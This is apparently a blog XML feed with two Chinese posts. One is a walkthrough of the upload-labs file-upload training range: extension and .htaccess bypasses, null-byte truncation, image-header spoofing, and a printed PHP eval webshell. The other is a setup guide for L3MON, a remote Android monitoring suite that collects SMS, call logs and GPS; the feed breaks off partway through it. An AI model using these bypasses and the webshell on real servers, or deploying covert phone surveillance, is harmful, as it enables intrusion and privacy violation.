<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>文件上传靶场练习</title>
      <link href="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传靶场练习"><a href="#文件上传靶场练习" class="headerlink" title="文件上传靶场练习"></a>文件上传靶场练习</h1><p>靶场资源链接：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p>利用phpstudy搭建</p><h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p><strong>查看源码</strong></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image1.png" alt="image"></p><p><strong>创建一句话木马文件，并保存为png格式</strong></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image2.png" alt="image2"></p><p><strong>上传，并用burpsuite开启抓包</strong></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image3.png" alt="image3"></p><p><strong>将格式改为php</strong></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image4.png" alt="image4"></p><p><strong>上传成功！可以访问一下，或者用菜刀工具连接。</strong></p><h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image5.png" alt="image5"></p><p>用burpsuite抓包时修改一下content-type为常见的图片类型，比如image/gif</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image6.png" alt="image6"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image7.png" alt="image7"></p><h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1><p>查看源码，可知此关设置了一个黑名单，来拒绝一些常见的脚本文件后缀，比如asp aspx php jsp等，但一些脚本文件有多个不同的后缀名来表示，比如php文件也可以写为phtml或者php3等。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image8.png" alt="image8"></p><p>抓包将文件后缀名改为phtml</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image9.png" alt="image9"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image10.png" alt="image10"></p><h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1><p>查看源码，此关的黑名单更加全。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image11.png" alt="image11"></p><p>但是没有发现对.htaccess文件的过滤，于是编写一个.htaccess，不能用记事本创建，用notepad++创建，保存为.htaccess文件名。</p><p><code>&lt;FilesMatch &quot;hack&quot;&gt;</code><br>    <code># 修改文件类型 – 下面可以让任何的文件都成为PHP那么被服务器解释</code><br>    <code>SetHandler application/x-httpd-php</code><br>    <code>AddType application/x-httpd-php .jpg</code><br><code>&lt;/FilesMatch&gt;</code></p><p>然后将.htaccess上传到服务器，接着直接上传一个hack.png文件，上面的.htaccess文件表示将任何的hack文件名的文件解析为php文件。</p><p>接着访问hack.png，解析成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image12.png" alt="image12"></p><p>注：关于.htaccess文件，在apache的WEB环境中，我们经常会使用.htaccess这个文件来确定某个目录下的URL重写规则，特别是一些开源的CMS或者框架当中经常会用到，比如著名的开源论坛discuz!，就可以通过.htaccess文件实现URL的静态化，大部分PHP框架，例如ThinkPHP和Laravel，在apache环境下会用.htaccess文件实现路由规则。 但是如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。</p><p>具体可参考<a href="https://zhuanlan.zhihu.com/p/38246662">https://zhuanlan.zhihu.com/p/38246662</a></p><h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><p>此关黑名单中有.htaccess，因此利用.htaccess文件进行绕过不可行。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image13.png" alt="image13"></p><p>我们可以看到，在对文件名进行处理的时候是先去点，然后去大小写，最后去空，这些操作是一次性的。于是我们可以这样对文件后缀进行处理，<code>hack.php. .</code>，这样的话处理得到的文件名为<code>hack.php.</code>，在windows中文件后缀的.会默认去掉，因此就会解析为php文件。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image14.png" alt="image14"></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image15.png" alt="image15"></p><h1 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h1><p>这关源代码里面少了行去大小写的处理，由于windows中是不区分大小写的，因此我们可以将文件后缀换为.pHP来进行绕过。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image16.png" alt="image16"></p><p>上传文件后缀改为.pHP</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image17.png" alt="image17"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image18.png" alt="image18"></p><h1 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h1><p>这关是缺少了去空，因此只需要在文件后缀加空格就行。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image19.png" alt="image19"></p><p>文件后缀加空格</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image20.png" alt="image20"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image21.png" alt="image21"></p><h1 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h1><p>此关缺少对文件后缀.的处理，只需要在文件后缀后面加.即可。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Users\朱易明\AppData\Roaming\Typora\typora-user-images\image-20211228185252928.png" alt="image-20211228185252928"></p><p>文件后缀加.</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image22.png" alt="image22"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image23.png" alt="image23"></p><h1 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h1><p>第一种方法本关同第五关。</p><p>第二种方法是其代码并未对::$DATA做过滤</p><p>利用Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性 DATA ，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:b.asp，请求 a.asp:b.asp::$DATA，则是请求a.asp中的流数据b.asp的流数据的内容。<br><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image24.png" alt="image24"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image25.png" alt="image25"></p><h1 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h1><p>本关同第五关一样。</p><h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><p>这里解读一下源码</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image26.png" alt="image26"></p><p>文件名被替换</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image27.png" alt="image27"></p><p>因为此处只替换了一次，因此只需要进行双写就可以，文件名为hack.pphphp</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image28.png" alt="image28"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image29.png" alt="image29"></p><h1 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h1><p>查看源码可知还是白名单过滤，分析源码可以看到系统在保存文件的时候对文件进行了重命名，利用GET获取save_path也就是url地址值，然后进行字符串的拼接。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image30.png" alt="image30"></p><p>因此可以在url处进行处理，用burpsuite抓包，在save_path后面加上自定义的一个php文件名，并在其后面加上%00截断符，这样在进行文件重命名时截断符就会截断后面的拼接字符串。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image31.png" alt="image31"></p><p>此处仍然会失败，因此%00截断的适用条件为：</p><ul><li><p>PHP版本&lt;5.3.4</p></li><li><p>php.ini中magic_quotes_gpc=off</p><p><strong>切换一下php版本</strong></p></li></ul><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image32.png" alt="image32"></p><p><strong>关闭魔术引号</strong></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image33.png" alt="image33"></p><p><strong>上传成功！</strong></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image34.png" alt="image34"></p><h1 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h1><p>查看本关源码，其实与12关类似，只不过提交参数save_path的方式变为了POST。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image35.png" alt="image35"></p><p>因为是POST传递参数，因此%00不会像GET方式一样自动转码，得手动转码</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image36.png" alt="image36"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image37.png" alt="image37"></p><h1 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h1><p>一些站点会使用文件头来检测文件类型，这种情况可以在文件前面加入对应的字节来绕过检查。几种常见的文件类型的头字节如下所示：</p><table><thead><tr><th>类型</th><th>十六进制值</th></tr></thead><tbody><tr><td>JPG</td><td>FFD8FFE000104A464946</td></tr><tr><td>GIF</td><td>474946383961</td></tr><tr><td>PNG</td><td>89504E47</td></tr><tr><td>TIF</td><td>49492A00</td></tr><tr><td>BMP</td><td>424D</td></tr></tbody></table><p>查看源码，服务端读取了上传文件的前两个字节来进行内容的判断，然后判断该文件是否在白名单之中。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image38.png" alt="image38"></p><p>这样的话我们可以往要上传的文件头部添加对应格式的数据来完成绕过</p><p>比如在文件头部加入JPG的头部格式–FFD8FFE000104A464946，有十位，因此先在文件内容填入1234567891</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image39.png" alt="image39"></p><p>然后找到这十位数字对应的位置，将其改为JPG对应的十六进制格式</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image40.png" alt="image40"></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image41.png" alt="image41"></p><p>简单来说，就是往一个正常的图片文件里面插入木马语句，上传成功后是以图片格式保存的，然后通过<strong>文件包含漏洞</strong>，将这个图片以脚本文件来执行。</p><p>比如这里用cmd命令将一个php文件和jpg图片结合在一起</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image42.png" alt="image42"></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image43.png" alt="image43"></p><p>上传该png文件，然后通过文件包含漏洞来执行该文件</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image44.png" alt="image44"></p><p>文件马里面包含的php语句为<code>&lt;?php @eval($_POST[&#39;x&#39;]) ;?&gt;</code></p><p>POST方式传递参数<code>x=phpinfo();</code></p><p>执行成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image45.png" alt="image45"></p><h1 id="Poss-15"><a href="#Poss-15" class="headerlink" title="Poss-15"></a>Poss-15</h1><p>本关的绕过方式与14关相同，这里主要介绍的是getimagesize()函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getimagesize()函数:</span><br><span class="line"></span><br><span class="line">用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</span><br><span class="line"></span><br><span class="line">getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</span><br></pre></td></tr></table></figure><h1 id="Poss-16"><a href="#Poss-16" class="headerlink" title="Poss-16"></a>Poss-16</h1><p>本关绕过方式同上。这关使用exif_imagetype()函数来判断文件类型（需要开启php_exif模块）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exif_imagetype()函数：**</span><br><span class="line"></span><br><span class="line">判断一个图像的类型</span><br><span class="line"></span><br><span class="line">exif_imagetype() 读取一个图像的第一个字节并检查其签名。</span><br></pre></td></tr></table></figure><h1 id="Poss-17"><a href="#Poss-17" class="headerlink" title="Poss-17"></a><strong>Poss-17</strong></h1><p>本关绕过方式同上，只不过这里的判断方式是用了<code>imagecreatefromjpeg()</code>、<code>imagecreatefrompng()</code>、<code>imagecreatefromgif()</code>三个判断函数。</p><h1 id="Poss-18"><a href="#Poss-18" class="headerlink" title="Poss-18"></a>Poss-18</h1><p>分析源码</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image46.png" alt="image46"></p><p>我这里修改服务器代码，输出upload_file和temp_file</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image47.png" alt="image47"></p><p>上传一个php文件</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image48.png" alt="image48"></p><p>现在连利用burosuite续上传一个php文件，然后中途访问</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image49.png" alt="image49"></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image50.png" alt="image50"></p><p>开始发送，中途不断访问这个hack.php文件，中途会偶尔有这个显示然后刷新又消失，这是说明这个php文件短暂的存储与服务器中。</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image51.png" alt="image51"></p><h1 id="Poss-19"><a href="#Poss-19" class="headerlink" title="Poss-19"></a>Poss-19</h1><p>按理来说这关和18关一样，但我中途完全访问不到上传的php文件，清除了浏览器缓存也不行，待解。</p><h1 id="Poss-20"><a href="#Poss-20" class="headerlink" title="Poss-20"></a>Poss-20</h1><p>分析源码</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image52.png" alt="image52"></p><h2 id="方法1——通过指定文件名的修改"><a href="#方法1——通过指定文件名的修改" class="headerlink" title="方法1——通过指定文件名的修改"></a>方法1——通过指定文件名的修改</h2><p>上传php文件并抓包</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image53.png" alt="image53"></p><p>对其进行修改</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image54.png" alt="image54"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image55.png" alt="image55"></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image56.png" alt="image56"></p><h2 id="方法2——修改文件夹名称"><a href="#方法2——修改文件夹名称" class="headerlink" title="方法2——修改文件夹名称"></a>方法2——修改文件夹名称</h2><p>分析源码</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image57.png" alt="image57"></p><p>上传php文件并抓包，修改文件夹名称</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image58.png" alt="image58"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image59.png" alt="image59"></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image60.png" alt="image60"></p><h1 id="Poss-21"><a href="#Poss-21" class="headerlink" title="Poss-21"></a>Poss-21</h1><p>分析源码</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image61.png" alt="image61"></p><p>我们上传抓包，给save_name赋值为一个数组，将数组第一位赋值为hack.php，最后一位赋值为jpg</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image62.png" alt="image62"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image63.png" alt="image63"></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image64.png" alt="image64"></p><p>靶场练习结束！</p>]]></content>
      
      
      <categories>
          
          <category> web安全渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白，学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>L3MON-安卓手机监控教程</title>
      <link href="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/"/>
      <url>/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="注明"><a href="#注明" class="headerlink" title="注明"></a>注明</h1><p>本文仅供学习交流和技术分享，禁止用于任何违法行为！详细参考《中华人民共和国网络安全法》，软件本为开源，本人只是介绍安装技术，如果进行违法犯罪活动与本人无关，请大家遵纪守法，做合法公民，健康上网，远离犯罪。</p><h1 id="L3MON软件介绍"><a href="#L3MON软件介绍" class="headerlink" title="L3MON软件介绍"></a>L3MON软件介绍</h1><ul><li>L3MON是一个基于云端的远程安卓管理套件</li><li>可以通过云端管理以下资料访问</li><li>手机短信</li><li>通话记录、通话时长</li><li>手机系统的文件</li><li>手机安装的程序</li><li>GPS定位</li><li>浏览器页面访问记录</li></ul><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image1.png" alt="image1"></p><h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a><strong>搭建环境</strong></h1><p><strong>ubuntu18.04</strong></p><p>本人在阿里云上申请了一台云服务器，系统为ubuntu18.04，申请步骤可网上自行参考资料。进入ubuntu系统</p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image2.png" alt="image2"></p><p><strong>安装java 1.8.0</strong></p><p>L3MON软件仅支持java1.8.0，所以java版本过高过低都不行，申请的ubuntu系统是默认没有安装java的。</p><p>在linux上安装java有多种方式，我这里使用命令行模式安装推荐安装openjdk</p><p>首先更新软件包列表</p><p><code>apt-get update</code></p><p>然后安装openjdk-8-jdk</p><p><code>apt-get install openjdk-8-jdk</code></p><p>安装结束后查看一下java版本</p><p><code>java -version</code></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image3.png" alt="image3"></p><p><strong>安装node.js和npm</strong></p><p><code>apt install nodejs npm</code></p><p>查看nodejs和npm版本</p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image4.png" alt="image4"></p><p><strong>安装pm2依赖</strong></p><p><code>npm install pm2 -g</code></p><p><strong>安装git命令</strong></p><p><code>apt install apt</code></p><p>在阿里云上clone速度很慢，需要更改一下配置文件，编辑<code>/etc/ssh/ssh_config</code>，找到<code>GSSAPIAuthentication no</code>，将注释符删掉即可。</p><p><code>vim /etc/ssh/ssh_config</code></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image5.png" alt="image5"></p><p><strong>克隆L3MON项目</strong></p><p><code>git clone https://github.com/D3VL/L3MON</code></p><p><strong>进入L3MON的server目录</strong></p><p><code>cd L3MON/server/</code></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image6.png" alt="image6"></p><p><strong>运行L3MON</strong></p><p><code>pm2 start index.js</code></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image7.png" alt="image7"></p><p><code>pm2 startup</code></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image8.png" alt="image8"></p><p>启动apache2服务，如果没有apache2服务，可以先安装一下</p><p><strong>安装apache2</strong></p><p><code>apt install apache2</code></p><p><strong>启动apache2服务（默认端口是80）</strong></p><p><code>service apache2 start</code></p><p><strong>查看apache2运行状态</strong></p><p><code>service apache2 status</code></p><p>由于L3MON登录需要配置用户名和密码，因此先<strong>暂停L3MON服务</strong></p><p><code>pm2 stop index</code></p><p><strong>配置maindb.json</strong></p><p><code>vim maindb.json</code></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image9.png" alt="image9"></p><p>直接将内容全部替换为如下</p><p><code>&#123;</code><br>  <code>&quot;admin&quot;:&#123;</code><br>    <code>&quot;username&quot;:&quot;admin&quot;,</code><br>    <code>&quot;password&quot;:&quot;25d55ad283aa400af464c76d713c07ad&quot;,</code><br>    <code>&quot;loginToken&quot;:&quot;&quot;,</code><br>    <code>&quot;logs&quot;:[],</code><br>    <code>&quot;iplog&quot;:[]</code></p><p><code>&#125;,     &quot;clients&quot;:[]</code></p><p><code>&#125;</code></p><p>其中username是登录的用户名，password是登录密码的MD5值，如果想改其他密码就输入想设置密码的MD5值即可。</p><p>L3MON的默认端口是22533，于是我们得去服务器后台把该开启的端口全给开了，不然登陆不进去。</p><p><strong>进入服务器实例——安全组</strong></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image10.png" alt="image10"></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image11.png" alt="image11"></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image12.png" alt="image12"></p><p>其中80、22533分别是apache2和L3MON的端口，22222是L3MON生成app的指定端口</p><p><strong>现在浏览器输入http://服务器公网ip:L3MON端口</strong></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image13.png" alt="image13"></p><p><strong>用之前设置的用户名和密码登录即可</strong></p><p><img 